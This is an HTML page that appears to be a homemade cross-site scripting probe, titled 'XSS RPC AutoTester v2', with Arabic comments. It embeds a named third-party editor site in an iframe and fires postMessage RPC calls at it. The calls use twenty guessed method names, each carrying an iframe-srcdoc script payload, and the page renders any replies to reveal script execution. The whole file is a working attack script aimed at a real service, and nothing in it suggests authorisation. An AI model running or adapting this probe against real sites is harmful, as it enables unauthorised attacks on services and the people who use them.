<!DOCTYPE html>
<html>
<head>
  <title>XSS RPC Tester</title>
</head>
<body>
  <h1>🔥 XSS RPC AutoTester v2</h1>
  <iframe id="evil" src="https://tb.toloka.dev/editor" style="width:100%;height:600px;border:1px solid #000;"></iframe>

  <script>
    const iframe = document.getElementById("evil").contentWindow;
    const origin = "https://tb.toloka.dev";
    const payload = `<iframe srcdoc="<script>top.alert('🔥 XSS triggered')<\/script>"></iframe>`;

    const methods = [
      "renderMarkdown", "loadPreview", "getPreview", "injectTemplate", "parseHTML",
      "setContent", "showMarkdown", "convert", "previewTemplate", "parseTemplate",
      "display", "loadMarkdown", "send", "getMessage", "reply", "getData",
      "read", "getText", "render", "echo"
    ];

    let counter = 1;

    // استقبال الردود
    window.addEventListener("message", function(event) {
      if (event.origin !== origin) return;

      const { type, id, result, error } = event.data || {};
      console.log(`[📩] Received: id=${id}, type=${type}`);
      if (error) {
        console.warn(`[❌] Error from method id=${id}:`, error);
      } else if (result) {
        console.log(`[✅] Result from id=${id}:`, result);

        // محاولة العرض داخل iframe لرؤية تأثير XSS
        const preview = document.createElement("iframe");
        preview.style = "width:100%;height:100px;border:1px dashed red;margin:5px;";
        preview.srcdoc = result;
        document.body.appendChild(preview);
      }
    });

    function sendRPC(method, params = []) {
      const id = "xss-test-" + (counter++);
      console.log(`[🚀] Sending RPC: method=${method}, id=${id}`);
      iframe.postMessage({
        type: "RPC",
        method,
        id,
        params
      }, origin);
    }

    // جرب كل دالة مع عدة أنواع من params
    methods.forEach(method => {
      // مجرد payload فقط
      sendRPC(method, [payload]);

      // payload مع كائن
      sendRPC(method, [payload, { target: "main" }]);

      // payload ضمن كائن كبير
      sendRPC(method, [{ html: payload, safe: false }]);
    });
  </script>
</body>
</html>
